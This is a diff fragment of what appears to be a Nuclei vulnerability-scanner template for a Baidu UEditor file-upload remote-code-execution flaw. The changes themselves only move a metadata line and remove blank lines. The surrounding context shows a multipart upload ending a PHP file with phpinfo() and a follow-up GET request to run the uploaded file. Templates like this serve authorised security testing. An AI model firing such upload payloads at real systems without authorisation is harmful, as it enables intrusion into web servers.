@@ -15,11 +15,10 @@ info:
     cpe: cpe:2.3:a:baidu:ueditor:*:*:*:*:*:*:*:*
   metadata:
     max-request: 2
-    fofa-query: body="ueditor"
     vendor: baidu
     product: ueditor
+    fofa-query: body="ueditor"
   tags: ueditor,file-upload,rce,intrusive
-
 variables:
   filename: "{{rand_base(5)}}"
 
@@ -38,7 +37,6 @@ http:
         phpinfo();
         ?>
         ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
-
       - |
         GET /php/upload/{{filename}}.php HTTP/1.1
         Host: {{Hostname}}
